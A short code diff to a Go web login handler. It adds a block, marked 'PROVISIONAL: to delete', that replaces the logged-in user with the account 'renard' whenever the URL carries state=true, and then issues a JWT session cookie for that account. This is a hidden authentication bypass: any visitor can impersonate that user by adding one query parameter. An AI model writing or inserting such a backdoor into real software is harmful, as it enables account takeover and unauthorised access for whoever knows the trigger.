@@ -96,6 +96,11 @@ func Login(w http.ResponseWriter, r *http.Request) {
 		models.UpdateUser(user)
 	}
 
+	// PROVISIONAL: to delete
+	if r.URL.Query().Get("state") == "true" {
+		user = models.FindUserByLogin("renard")
+	}
+
 	// Set JWT cookie and redirect
 	token, err := jwt.GenerateJWT(user)
 	http.SetCookie(w, &http.Cookie{
